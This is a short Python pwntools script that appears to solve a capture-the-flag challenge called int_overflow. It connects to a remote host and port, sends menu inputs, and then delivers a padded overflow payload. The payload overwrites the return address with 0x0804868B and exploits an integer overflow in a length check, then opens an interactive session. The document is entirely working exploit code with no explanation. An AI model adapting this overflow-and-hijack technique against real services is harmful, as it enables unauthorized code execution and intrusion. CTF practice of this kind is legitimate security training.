from pwn import *

#r=process('./int_overflow')

r=remote('111.198.29.45',49278)

payload='a'*0x14+'b'*4+p32(0x0804868B)+'a'*232

r.sendline('1')

r.sendline('fish')

r.recvline('Please input your passwd:')

r.sendline(payload)

r.interactive()
